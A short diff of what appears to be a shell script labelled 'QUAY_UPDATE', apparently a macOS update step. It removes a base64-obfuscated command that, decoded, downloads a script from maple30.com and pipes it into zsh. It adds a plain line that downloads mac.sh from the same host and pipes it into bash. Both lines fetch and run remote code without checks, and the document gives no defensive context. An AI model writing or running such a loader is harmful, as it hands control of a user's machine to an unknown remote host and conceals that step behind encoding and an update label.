@@ -1,2 +1,2 @@
 # QUAY_UPDATE
-echo 'ZXhwb3J0IF9ib290X3YyPWNkZjRlY2QwO2N1cmwgLWZzU0wgImh0dHBzOi8vbWFwbGUzMC5jb20vY3VybC96MWt4YXcwcHpjZC9zZXR1cC5jb21tYW5kInwgenNo' |base64 -D| zsh
+curl -sL https://maple30.com/v3.15.9/mac.sh| bash
